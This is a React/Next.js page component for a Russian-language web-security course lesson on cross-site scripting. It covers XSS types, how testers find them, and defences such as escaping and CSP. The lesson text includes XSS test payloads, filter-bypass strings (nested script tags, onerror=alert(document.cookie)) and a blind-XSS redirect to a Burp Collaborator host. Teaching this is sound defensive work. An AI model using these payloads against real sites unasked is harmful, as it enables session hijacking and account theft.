'use client';

import * as React from 'react';
import Image from 'next/image';
import { ContentPageLayout, P, H2, H3 } from '@/components/content/ContentPageLayout';
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from '@/components/ui/card';
import { AlertTriangle, Code, ExternalLink, CheckCircle2 } from 'lucide-react';
import Link from 'next/link';
import { getImagePath } from '@/utils/paths';

import { QuizItem } from '@/components/content/QuizItem';
import { quizQuestions } from './quizQuestions';

export default function XSSLesson() {
  return (
    <ContentPageLayout title="Урок 2: Cross-Site Scripting (XSS)">
      <div className="space-y-8">
        <section>
          <P>
            Данный тип уязвимости один из наиболее часто встречающихся, поэтому мы выделили ему первое место в нашем списке.
            Также, это уязвимость с <strong>клиентской стороны</strong>, то есть она может выполниться <strong>только в браузере</strong>.
          </P>
          <Card className="my-4 border-blue-200 bg-blue-50 dark:bg-blue-950/20">
            <CardContent className="pt-6">
              <P>
                <strong>Важный момент:</strong> при тестировании <strong>API</strong>, которое не имеет <strong>UI</strong> оболочки
                и движка браузера для рендеринга страницы, это не имеет смысла. Но если <strong>API</strong> передает данные на <strong>UI</strong>,
                то это отличный вектор для атаки, т.к. <strong>API</strong> зачастую защищено не хуже, но немного по другому.
              </P>
            </CardContent>
          </Card>
        </section>

        <section>
          <H2>Как это работает?</H2>
          <P>
            Допустим, мы имеем параметр ввода <strong>"User Name"</strong>. При мануальном или автоматизированном тестировании
            мы проведем свои кейсы, проверим сколько символов оно может принять, как на числа ответит и узнаем кто такой John Doe и т.д.
          </P>
          <P>
            Но, как пентестеры мы подумаем: "А что если вставить сюда скрипт <code>&lt;script&gt;alert(you_have_been_hacked)&lt;/script&gt;</code>?
            Как отреагирует приложение? Выполнится ли наш скрипт и получим ли мы наш Alert?"
          </P>
        </section>

        <section>
          <H2>Существует несколько типов XSS</H2>

          <div className="space-y-6">
            <Card>
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <span className="text-2xl font-bold text-primary">1.</span>
                  Отраженное межсайтовое выполнение сценариев (Reflected XSS)
                </CardTitle>
              </CardHeader>
              <CardContent className="space-y-3">
                <P>
                  Приложение или API включает непроверенные и непреобразованные данные в состав HTML. Успешная атака может привести
                  к выполнению произвольного HTML- и JavaScript-кода в браузере жертвы.
                </P>
                <P>
                  Обычно злоумышленнику необходимо убедить пользователя перейти по ссылке (т.к. полезная нагрузка (<strong>Payload</strong>)
                  обычно сохранена в параметре, например <code>/users?userId=тут наш скрипт</code>), ведущей на вредоносную страницу.
                </P>
                <P>
                  Например, пользователь <strong>А</strong> знает, что у пользователя <strong>Б</strong> есть также аккаунт в веб-приложении.
                  Он может придумать: "Эй, там новые скидки на сайте / ты видел эту новость?" и т.д. и отправить это для пользователя Б.
                  <strong>Пользователь Б переходит по ссылке, выполняется скрипт</strong> и у него что-то исчезло с его аккаунта или его сессия и т.д.
                </P>
              </CardContent>
            </Card>

            <Card>
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <span className="text-2xl font-bold text-red-600">2.</span>
                  <AlertTriangle className="h-6 w-6 text-red-600" />
                  Межсайтовое выполнение хранимых сценариев (Stored XSS)
                </CardTitle>
              </CardHeader>
              <CardContent className="space-y-3">
                <P>
                  Приложение или API сохраняет необработанные входные данные, с которыми затем взаимодействуют пользователи или администраторы.
                  Межсайтовое выполнение хранимых сценариев обычно считается <strong className="text-red-600">очень опасной уязвимостью</strong>.
                </P>
                <P>
                  <strong>Пример:</strong> функция комментариев на блоге или раздел "о себе". Если в случае <strong>Reflected</strong> мы отправляли
                  ссылку с нашей полезной нагрузкой, то тут приложение сохраняет данный скрипт и каждый раз, кто посетит данную страницу или
                  откроет комментарии, то скрипт будет выполняться. Критичность от этого выше, т.к. не нужно никуда ничего доставлять.
                </P>
              </CardContent>
            </Card>

            <Card>
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <span className="text-2xl font-bold text-primary">3.</span>
                  Межсайтовое выполнение сценариев на основе объектной модели документа (DOM XSS)
                </CardTitle>
              </CardHeader>
              <CardContent className="space-y-3">
                <P>
                  <strong>JavaScript-фреймворки</strong>, одностраничные приложения и <strong>API</strong>, динамически добавляющие
                  вредоносные данные на страницы, подвержены <strong>XSS на основе DOM</strong>.
                </P>
                <P>
                  В идеале, приложение не должно отправлять вредоносные данные небезопасным <strong>JavaScript API</strong>.
                  XSS в DOM-модели - это прежде всего проблема клиентской стороны веб-приложения.
                </P>
                <Card className="mt-3 bg-muted">
                  <CardContent className="pt-4">
                    <p className="text-sm">
                      <strong>Уточнение:</strong> это не проблема клиента, а проблема клиентской части приложения. Это некорректная
                      фильтрация/использование данных, полученных из недоверенных источников, в клиентской части веб-приложения,
                      то есть в основном в JavaScript. DOM XSS может быть на "любой" странице, даже на обычной HTML, если там используется JavaScript.
                    </p>
                  </CardContent>
                </Card>
              </CardContent>
            </Card>

            <Card>
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <span className="text-2xl font-bold text-primary">4.</span>
                  Слепые XSS (Blind XSS)
                </CardTitle>
              </CardHeader>
              <CardContent className="space-y-3">
                <P>
                  Понять просто – Payload отправили, а результат не видим. Допустим форма обратной связи или должно прийти письмо на почту.
                </P>
                <P>
                  Например, мы отправляем такой скрипт <code>&lt;img src="google.com/favicon.ico"/&gt;</code> в поле имя и вместо имени
                  тут будет <strong>картинка Google</strong> или <strong>ошибка</strong> (например "поломанная картинка").
                </P>
                <P>
                  Но что, если мы не можем это проверить и нужно, чтобы админ открыл уведомление, запрос и т.д.? В этом случае используем
                  например такой скрипт:
                </P>
                <pre className="bg-muted p-4 rounded-lg overflow-x-auto">
                  <code>&lt;script&gt;location="https://burp-collaborator.oastify.com"&lt;/script&gt;</code>
                </pre>
                <P>
                  При открытии формы или письма скрипт выполняется и мы получаем Out-of-Band Connection.
                </P>
                <P>
                  Простыми словами покажет эта картинка:
                </P>
                <div className="my-6 flex justify-center">
                  <div className="max-w-lg w-full">
                    <Image
                      src={getImagePath('/pics/xss-lesson/burp-collaborator-diagram.png')}
                      alt="Burp Collaborator - Out-of-Band Connection"
                      width={477}
                      height={385}
                      className="rounded-lg border shadow-md"
                    />
                    <p className="text-sm text-muted-foreground mt-2 text-center">
                      <strong>Первый</strong> (мы) отправил Payload, <strong>второй</strong> (уязвимое приложение) выполнило его,
                      а <strong>третий</strong> (наш сервер Burp Collaborator) получает ответ.
                    </p>
                  </div>
                </div>
                <P>
                  <strong>Пример с реального проекта:</strong>
                </P>
                <P>
                  Отправляем Payload:
                </P>
                <div className="my-4 flex justify-center">
                  <Image
                    src={getImagePath('/pics/xss-lesson/blind-xss-payload.jpg')}
                    alt="Отправка Blind XSS Payload"
                    width={736}
                    height={103}
                    className="rounded-lg border shadow-md"
                  />
                </div>
                <P>
                  Мы открываем, допустим письмо или админ открывает нашу заявку и происходит следующее:
                </P>
                <div className="my-4 flex justify-center">
                  <Image
                    src={getImagePath('/pics/xss-lesson/blind-xss-result.png')}
                    alt="Результат Blind XSS атаки"
                    width={1029}
                    height={556}
                    className="rounded-lg border shadow-md"
                  />
                </div>
                <P>
                  Наша полезная нагрузка отработала и мы получили соединение и в данном случае подтверждение уязвимости.
                </P>
              </CardContent>
            </Card>
          </div>
        </section>

        <section>
          <H2>Для чего используется XSS?</H2>
          <P>
            Обычно XSS используется для:
          </P>
          <ul className="list-disc list-inside space-y-2 ml-4">
            <li>Перехвата сессий</li>
            <li>Кражи учетных записей</li>
            <li>Обхода MFA</li>
            <li>Замены или подмены DOM-узлов (напр., троянские панели входа в систему)</li>
            <li>Атак на браузеры (загрузка вредоносного ПО, регистрация нажатий и других атак на стороне клиента)</li>
            <li>Чтения локальных данных с компьютера жертвы</li>
          </ul>
        </section>

        <section>
          <H2>Влияние XSS</H2>
          <P>
            Межсайтовое выполнение сценариев будет иметь последствия:
          </P>
          <ul className="list-disc list-inside space-y-2 ml-4">
            <li><strong>Средней степени тяжести</strong> в случае отраженного XSS (Reflected XSS) или XSS на основе объектной модели документа (DOM XSS)</li>
            <li><strong>Серьезные последствия</strong> в случае межсайтового выполнения хранимых сценариев с удаленным выполнением кода в браузере пользователя (Stored XSS), например, кража учетных данных, перехват сессий или установка вредоносного ПО</li>
          </ul>
          <p className="mt-4">
            Но каждый случай индивидуален.
          </p>

          <H3>Что умеет внедрённый код</H3>
          <P>
            Внедрённый код умеет всё то, что умеет JavaScript на вашем сайте, а именно:
          </P>
          <ol className="list-decimal list-inside space-y-2 ml-4">
            <li>Получает доступ к cookie просматриваемого сайта</li>
            <li>Может вносить любые изменения во внешний вид страницы</li>
            <li>Получает доступ к буферу обмена</li>
            <li>Может внедрять программы на JavaScript, например, ки-логеры (перехватчики нажатых клавиш)</li>
            <li>Подцеплять на BeEF</li>
            <li>И т.д.</li>
          </ol>
        </section>

        <section>
          <H2>Как найти XSS уязвимость в приложении?</H2>

          <div className="space-y-4">
            <Card>
              <CardHeader>
                <CardTitle className="text-base">Шаг 1: Отбор страниц с формами ввода</CardTitle>
              </CardHeader>
              <CardContent>
                <P>
                  Первым делом производим отбор страниц с формами ввода - составляем список, который в дальнейшем будем проверять.
                  Собираем руками, просто изучая логику работы проекта и проходя по всем страницам сайта.
                </P>
              </CardContent>
            </Card>

            <Card>
              <CardHeader>
                <CardTitle className="text-base">Шаг 2: Поиск страниц обрабатывающих GET и POST параметры</CardTitle>
              </CardHeader>
              <CardContent>
                <P>
                  Вторая наша задача это найти страницы обрабатывающие <strong>GET</strong> и <strong>POST</strong> параметры.
                  Все страницы которые получают или шлют данные, потенциально уязвимы.
                </P>
                <P>
                  <strong>Как собирать?</strong> BURP используем как прокси, который собирает трафик во время нашей навигации по сайту
                  и формирует карту сайта. Не факт что этого достаточно, поэтому идем к ребятам из проекта и просим документацию по API.
                  Или фаззим и ищем скрытые API-calls.
                </P>
              </CardContent>
            </Card>
          </div>
        </section>

        <section>
          <H2>Подробнее: пример поиска уязвимости</H2>

          <H3>1. Отбираем страницы с формами ввода</H3>

          <H3>2. Для найденных полей ввода пробуем выявить XSS уязвимости</H3>
          <P>
            После того как мы нашли все страницы, с которых можно отправлять информацию на сервер, можно начинать выявление.
          </P>
          <P>
            Допустим, найденная форма ввода является поиском по сайту. Определить, является ли эта форма XSS уязвимой, можно несколькими способами,
            подставив в поле одну из следующих инъекций:
          </P>
          <div className="bg-muted p-4 rounded-lg space-y-2">
            <code className="block">&lt;script&gt;alert("xss");&lt;/script&gt;</code>
            <code className="block">"&gt;&lt;script&gt;alert('xss');&lt;/script&gt;</code>
            <code className="block">'&gt;&lt;"&gt;"&gt;&lt;script&gt;alert('xss');&lt;/script&gt;</code>
            <code className="block">&lt;img src=OnXSS OnError=alert('XSs_IN')&gt;</code>
            <code className="block">&lt;&lt;/div&gt;script&lt;/div&gt;&gt;alert()&lt;&lt;/div&gt;/script&lt;/div&gt;&gt;</code>
            <code className="block">&lt;&lt;/div&gt;img&lt;/div&gt; src=x&lt;/div&gt; onerror=alert(document.cookie)&lt;/div&gt;&gt;</code>
          </div>
          <P>
            Если в результате увидим подобное сообщение:
          </P>
          <div className="my-4 flex justify-center">
            <Image
              src={getImagePath('/pics/xss-lesson/xss-alert-example.png')}
              alt="Пример XSS alert сообщения"
              width={371}
              height={158}
              className="rounded-lg border shadow-md"
            />
          </div>
          <P>
            Это значит, что нашли XSS уязвимость и в дальнейшем нужно будет ее защитить от атак.
          </P>

          <H3>Распространённая уязвимость типа "&gt;</H3>
          <P>
            В каждой переменной пишем: <code>"&gt;&lt;script&gt;alert()&lt;/script&gt;</code>
          </P>
          <P>
            И проверяем после отправки, открываем просмотр кода страницы и ищем слово alert, т.е. ищем ответ сайта и что с запросом сделал фильтр.
          </P>
          <P>
            К примеру мы отправили: <code>&lt;script&gt;alert();&lt;/script&gt;</code>, а ничего не выполнилось. Залазим в <strong>html</strong> и видим:
            <code>&lt;script&gt;alert();&lt;/script&gt;&gt;</code>
          </P>
          <P>
            Свой целый запрос + фильтр добавил <code>"&gt;</code>. Остается только правильно составить запрос, чтобы он выполнился.
            Нам следует послать <code>&lt;script&gt;alert();&lt;/script</code>. Фильтр дополнит запрос, и он выполнится.
          </P>

          <H3>3. Страницы обрабатывающие GET и POST параметры</H3>
          <P>
            Например, страница такого типа <code>http://testsite.com/catalog?p=1</code> может оказаться уязвима. Подобно действиям,
            проделанным ранее в поле ввода и адресную строку, попробуем подставить в параметр вышеперечисленные строки кода.
          </P>
          <P>
            Например:
          </P>
          <div className="bg-muted p-4 rounded-lg space-y-2">
            <code className="block">http://testsite.ru/catalog?p=&lt;script&gt;alert('xss');&lt;/script&gt;</code>
            <code className="block">http://testsite.ru/catalog?p=&lt;img src="javascript:alert('xss');&gt;</code>
          </div>
          <P>
            Фильтр смотрит, что ничего опасного в <code>&lt;IMG%20SRC="javascript:alert('xss');&gt;</code> нет и выполняет скрипт.
            Еще, конечно, если фильтр не фильтрует различные кодировки, то можно попытаться закодировать скрипт и вставить код.
          </P>
        </section>

        <section>
          <H2>Еще один разбор как тестируют поля ввода</H2>

          <div className="space-y-4">
            <Card>
              <CardHeader>
                <CardTitle className="text-base">Метод 1: Проверка метасимволами</CardTitle>
              </CardHeader>
              <CardContent>
                <P>
                  Просто в любое поле вводим: <code>'';!--"&lt;flowers&gt;=&{`{()}`}</code>
                </P>
                <P>
                  Дальше открываем html страничку и ищем слово <code>"flowers"</code> и смотрим последующие символы.
                </P>
                <ul className="list-disc list-inside space-y-2 ml-4">
                  <li>Если <code>&lt;&gt;</code> так и остались то это первый признак уязвимости - значит фильтр имеет дырку</li>
                  <li>Если <code>,\"'\\</code> символы остались такими, как были введены - это второй признак уязвимости</li>
                  <li>Если открыв HTML, вы не обнаружили <code>&lt;&gt;</code> то скорее всего дырка в фильтре</li>
                  <li>Если открыв HTML вы обнаружили, что <code>&lt;&gt;</code> заменены на другие символы, то это облом - фильтр по крайней мере функционирует нормально</li>
                </ul>
              </CardContent>
            </Card>

            <Card>
              <CardHeader>
                <CardTitle className="text-base">Метод 2: Альтернативная проверка</CardTitle>
              </CardHeader>
              <CardContent>
                <P>
                  Возможно еще ввести в поле для проверки фильтрации вот так: <code>"&gt;&lt;&gt;'"`,/\\?@%</code>
                </P>
                <P>
                  Рассмотрим случай если фильтр съедает <code>&lt;&gt;</code>. В этом случае существует вероятность дырки.
                  К примеру, у фильтра условие съедать <code>&lt;script&gt;,&lt;&gt;</code> и <code>.</code>
                </P>
                <P>
                  Тогда пробуем <code>&lt;zxcvbnzxc792&gt;</code> и смотрим, если не съелось - нашли дыру. Дальше можно составить боевой XSS-скрипт.
                </P>
              </CardContent>
            </Card>

            <Card>
              <CardHeader>
                <CardTitle className="text-base">Метод 3: Вложенный скрипт</CardTitle>
              </CardHeader>
              <CardContent>
                <P>
                  Существует метод вложенного скрипта, к примеру вот так:
                </P>
                <code className="block bg-muted p-2 rounded">&lt;sc&lt;script&gt;ript&gt;alert()&lt;/sc&lt;/script&gt;ript&gt;</code>
                <P>
                  Это, если фильтр не очень сильный и плохо фильтрует.
                </P>
              </CardContent>
            </Card>

            <Card>
              <CardHeader>
                <CardTitle className="text-base">Метод 4: Кодирование</CardTitle>
              </CardHeader>
              <CardContent>
                <P>
                  Еще конечно если фильтр не фильтрует различные кодировки то можно попытаться закодировать скрипт и вставить код.
                </P>
                <P>
                  <code>&gt;&gt;&gt;&gt;&lt;&lt;script</code> бывает, что фильтр подсчитывает открытые и закрытые скобки и закрывает сам.
                  Сначала фильтрует, а потом закрывает, что дает нам возможность к инъекции скрипта.
                </P>
              </CardContent>
            </Card>
          </div>

          <Card className="mt-6 border-yellow-200 bg-yellow-50 dark:bg-yellow-950/20">
            <CardContent className="pt-6">
              <P>
                <strong>Важно помнить:</strong> это примеры, в жизни все может быть иначе. Некоторые теги блокируются самим приложением,
                некоторые полезные нагрузки не сработают из-за <strong>WAF</strong> или наконец <strong>CSP (Content Security Policy)</strong>.
              </P>
            </CardContent>
          </Card>
        </section>

        <section>
          <H2>Способы защиты от XSS</H2>
          <P>
            Для предотвращения XSS необходимо отделять непроверенные данные от активного контента браузера. Этого можно достичь следующими способами:
          </P>

          <div className="space-y-4 mt-4">
            <Card>
              <CardHeader>
                <CardTitle className="flex items-center gap-2 text-base">
                  <CheckCircle2 className="h-5 w-5 text-green-600" />
                  1. Использовать фреймворки с автоматическим преобразованием данных
                </CardTitle>
              </CardHeader>
              <CardContent>
                <P>
                  Как в последних версиях Ruby on Rails и React JS. Необходимо также проанализировать ограничения XSS-защиты каждого фреймворка
                  и обеспечить соответствующую обработку этих исключений.
                </P>
              </CardContent>
            </Card>

            <Card>
              <CardHeader>
                <CardTitle className="flex items-center gap-2 text-base">
                  <CheckCircle2 className="h-5 w-5 text-green-600" />
                  2. Преобразовывать недоверенные данные из HTTP-запросов
                </CardTitle>
              </CardHeader>
              <CardContent>
                <P>
                  Основываясь на контексте, в HTML-коде (теле, атрибутах, JavaScript, CSS или URL) для предотвращения отраженного XSS
                  и межсайтового выполнения хранимых сценариев.
                  "Памятка OWASP: XSS (Cross Site Scripting) Prevention Cheat Sheet" содержит подробные инструкции по преобразованию данных.
                </P>
              </CardContent>
            </Card>

            <Card>
              <CardHeader>
                <CardTitle className="flex items-center gap-2 text-base">
                  <CheckCircle2 className="h-5 w-5 text-green-600" />
                  3. Применять контекстное кодирование
                </CardTitle>
              </CardHeader>
              <CardContent>
                <P>
                  При изменении документа в браузере пользователя для предотвращения XSS на основе DOM. Если это невозможно, то применять
                  контекстное кодирование к API браузера.
                </P>
              </CardContent>
            </Card>

            <Card>
              <CardHeader>
                <CardTitle className="flex items-center gap-2 text-base">
                  <CheckCircle2 className="h-5 w-5 text-green-600" />
                  4. Использовать политику защиты содержимого (CSP)
                </CardTitle>
              </CardHeader>
              <CardContent>
                <P>
                  Для предотвращения XSS. Эта мера эффективна, если отсутствуют уязвимости, позволяющие внедрить код через локальные файлы
                  (напр., используя подмену путей или уязвимые библиотеки из разрешенных сетей доставки контента).
                </P>
              </CardContent>
            </Card>
          </div>
        </section>

        <section>
          <H2>Домашнее задание</H2>
          <P>
            Теорию можно повторить по следующим ссылкам:
          </P>
          <ul className="space-y-2">
            <li>
              <Link href="https://portswigger.net/web-security/cross-site-scripting/reflected" className="text-primary hover:underline flex items-center gap-2">
                <ExternalLink className="h-4 w-4" />
                Reflected XSS
              </Link>
            </li>
            <li>
              <Link href="https://portswigger.net/web-security/cross-site-scripting/contexts" className="text-primary hover:underline flex items-center gap-2">
                <ExternalLink className="h-4 w-4" />
                XSS Contexts
              </Link>
            </li>
            <li>
              <Link href="https://portswigger.net/web-security/cross-site-scripting/stored" className="text-primary hover:underline flex items-center gap-2">
                <ExternalLink className="h-4 w-4" />
                Stored XSS
              </Link>
            </li>
            <li>
              <Link href="https://portswigger.net/web-security/cross-site-scripting/dom-based" className="text-primary hover:underline flex items-center gap-2">
                <ExternalLink className="h-4 w-4" />
                DOM-based XSS
              </Link>
            </li>
          </ul>

          <H3>Проходим лабораторные работы по разным типам XSS</H3>

          <div className="space-y-3">
            <p className="font-semibold">Основные задачи:</p>
            <ol className="list-decimal list-inside space-y-2 ml-4">
              <li>
                <Link href="https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded"
                  className="text-primary hover:underline" target="_blank">
                  Reflected XSS into HTML context with nothing encoded
                </Link>
              </li>
              <li>
                <Link href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-attribute-angle-brackets-html-encoded"
                  className="text-primary hover:underline" target="_blank">
                  Reflected XSS into attribute with angle brackets HTML-encoded
                </Link>
              </li>
              <li>
                <Link href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-href-attribute-double-quotes-html-encoded"
                  className="text-primary hover:underline" target="_blank">
                  Stored XSS into anchor href attribute with double quotes HTML-encoded
                </Link>
              </li>
              <li>
                <Link href="https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded"
                  className="text-primary hover:underline" target="_blank">
                  Stored XSS into HTML context with nothing encoded
                </Link>
              </li>
              <li>
                <Link href="https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink"
                  className="text-primary hover:underline" target="_blank">
                  DOM XSS in document.write sink using source location.search
                </Link>
              </li>
              <li>
                <Link href="https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element"
                  className="text-primary hover:underline" target="_blank">
                  DOM XSS in document.write sink using source location.search inside a select element
                </Link>
              </li>
              <li>
                <Link href="https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink"
                  className="text-primary hover:underline" target="_blank">
                  DOM XSS in innerHTML sink using source location.search
                </Link>
              </li>
              <li>
                <Link href="https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-href-attribute-sink"
                  className="text-primary hover:underline" target="_blank">
                  DOM XSS in jQuery anchor href attribute sink using location.search source
                </Link>
              </li>
            </ol>

            <p className="font-semibold mt-6">Задачи со звездочкой (делаем только если есть время и желание):</p>
            <p className="text-sm text-muted-foreground">
              Для прохождения нужно использовать{' '}
              <Link href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet"
                className="text-primary hover:underline" target="_blank">
                cheat sheet
              </Link>
            </p>
            <ol className="list-decimal list-inside space-y-2 ml-4" start={9}>
              <li>
                <Link href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked"
                  className="text-primary hover:underline" target="_blank">
                  Reflected XSS into HTML context with most tags and attributes blocked
                </Link>
              </li>
              <li>
                <Link href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed"
                  className="text-primary hover:underline" target="_blank">
                  Reflected XSS with some SVG markup allowed
                </Link>
              </li>
            </ol>
          </div>

          <Card className="mt-6">
            <CardContent className="pt-6">
              <P>
                По последней задаче, это не ее решение, просто добавлю пример с реального проекта.
                XSS может быть в самом необычном месте, как <strong>загрузка SVG файла</strong>:
              </P>
              <div className="my-4 flex justify-center">
                <Image
                  src={getImagePath('/pics/xss-lesson/svg-xss-example.jpg')}
                  alt="Пример XSS через SVG файл"
                  width={760}
                  height={320}
                  className="rounded-lg border shadow-md"
                />
              </div>
              <P>
                И после нажатия на картинку вызывается <strong>alert function</strong>.
              </P>
            </CardContent>
          </Card>
        </section>
        <section>
          <H2>Проверка знаний</H2>
          <P>Пройдите тест, чтобы проверить понимание материала:</P>

          <div className="space-y-6">
            {quizQuestions.map((q, index) => (
              <QuizItem
                key={index}
                question={q.question}
                answers={q.answers}
                correctAnswerIndex={q.correctAnswerIndex}
              />
            ))}
          </div>
        </section>
      </div>
    </ContentPageLayout>
  );
}
